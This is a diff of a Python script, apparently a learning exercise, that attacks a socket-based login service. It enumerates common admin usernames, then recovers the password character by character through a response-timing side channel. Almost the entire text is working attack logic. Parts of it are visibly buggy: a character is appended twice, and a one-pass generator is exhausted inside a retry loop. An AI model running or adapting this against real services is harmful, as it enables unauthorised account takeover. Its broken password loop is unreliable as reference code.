@@ -3,6 +3,7 @@ import sys
 import itertools
 import json
 import string
+import datetime
 
 logins_list = [
 	"admin", "Admin", "admin1", "admin2", "admin3",
@@ -13,18 +14,24 @@ logins_list = [
 	"superadmin", "username", "username1"
 ]
 args = sys.argv
-host = args[1]
-port = int(args[2])
+host = args[1]  # "localhost"
+port = int(args[2])  # 9090
+
+
+def password_generator(i):
+	alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+	for password in itertools.product(alphabet, repeat=i):
+		yield "".join(password)
 
 
 def try_logins(logins, client_socket):
 	for login in logins:
 		login = login.strip()
-		message = json.dumps({"login": login, "password": ' '})
+		message = json.dumps({"login": login, "password": " "})
 		client_socket.send(message.encode())
 		response = json.loads(client_socket.recv(1024))
 		if response["result"] == "Wrong password!":
-			return login
+			return login.strip()
 
 
 def next_symbol():
@@ -32,18 +39,47 @@ def next_symbol():
 
 
 def try_passwords(login, client_socket):
-	password = ''
-	symbols = next_symbol()
+	password = ""
+	symbols = password_generator(1)
+
 	for symbol in symbols:
-		new_password = password + symbol
-		message = json.dumps({"login": login, "password": new_password})
+		password = password + symbol
+		message = json.dumps({"login": login, "password": password +symbol})
+		client_socket.send(message.encode())
+		start = datetime.datetime.now()
+		response = json.loads(client_socket.recv(1024))
+		difference = datetime.datetime.now() - start
+		if difference.total_seconds() > 0.1 or response["result"] == "Connection success!":
+			password += symbol
+			break
+		'''if response["result"] == "Connection success!":
+			print(json.dumps({"login": login, "password": password}))'''
+		print(message)
+
+def run(logins, client_socket):
+	global valid_login, response, message
+	for login in logins:
+		login = login.strip()
+		message = json.dumps({"login": login, "password": " "})
 		client_socket.send(message.encode())
 		response = json.loads(client_socket.recv(1024))
-		if response["result"] == 'Connection success!':
-			print(json.dumps({"login": login, "password": new_password}))
-			break
-		if response["result"] == 'Exception happened during login':
-			password = new_password
+		if response["result"] == "Wrong password!":
+			valid_login = login.strip()
+
+	valid_password = ""
+	symbols = password_generator(1)
+	while response["result"] != "Connection success!":
+		for symbol in symbols:
+			#password = password + symbol
+			message = json.dumps({"login": valid_login, "password": valid_password + symbol})
+			client_socket.send(message.encode())
+			start = datetime.datetime.now()
+			response = json.loads(client_socket.recv(1024))
+			difference = datetime.datetime.now() - start
+			if difference.total_seconds() > 0.1 or response["result"] == "Connection success!":
+				valid_password += symbol
+				break
+		print(message)
 
 
 def hack():
